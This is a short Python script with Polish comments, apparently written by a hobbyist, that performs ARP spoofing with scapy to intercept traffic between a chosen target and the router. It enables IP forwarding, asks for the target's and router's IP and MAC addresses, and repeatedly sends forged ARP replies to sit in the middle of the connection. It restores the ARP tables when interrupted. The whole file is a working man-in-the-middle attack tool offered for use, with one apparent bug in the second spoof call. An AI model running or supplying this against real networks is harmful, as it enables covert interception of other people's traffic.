#Skrypt ARP Spoofingu czyli przechwytywania ruchu sieciowego
import scapy.all as scapy
import time
import subprocess
import sys

#WLACZAMY PRZEKAZYWANIE PAKIETOW
subprocess.run("sysctl -w net.inet.ip.forwarding=1",shell=True, capture_output=True, text=True)

target_ip = input("PODAJ IP KTÓRE CHCESZ ŚLEDZIĆ ----> ")
target_mac = input("PODAJ MAC ADRES IP KTÓRE CHCESZ ŚLEDZIĆ ----> ")
spoof_ip = input("PODAJ IP ROUTERA -----> ")
spoof_mac = input("PODAJ MAC ADRES ROUTERA ----> ")

#OSZUKIWANIE
def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                   psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#PRZYWRACANIE DOMYSLNYCH USTAWIEN
def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                           psrc=spoof_ip, hwsrc= spoof_mac)
    scapy.send(packet, verbose=False)

#ROZPOCZYNAMY ŚLEDZENIE:
print("ŚLEDZENIE ROZPOCZĘTE: ")
try:
    counter = 0
    while True:
        counter +=2
        spoof(target_ip,spoof_ip,target_mac)
        spoof(spoof_ip,target_ip,target_mac)
        print("\r[+] WYSŁANO " + str(counter) + " PAKIETÓW ",end="")
        time.sleep(2)
#JEŚLI UŻYTKOWNIK WCIŚNIE CTRL + C TO PRZYWROCA SIE DOMYSLNE USTAWIENIA:
except KeyboardInterrupt:
    print("\n[-] WYKRYTO CTRL + C : ŚLEDZENIE ZOSTAŁO PRZERWANE")
    print("\n DZIĘKUJĘ ZA WSPÓLNĄ ZABAWĘ :)\n PROGRAM AUTORSKI: TOMEKTIGER")
    restore(target_ip, spoof_ip, target_mac, spoof_mac)
    subprocess.run("sysctl -w net.inet.ip.forwarding=0", shell=True, capture_output=True, text=True)


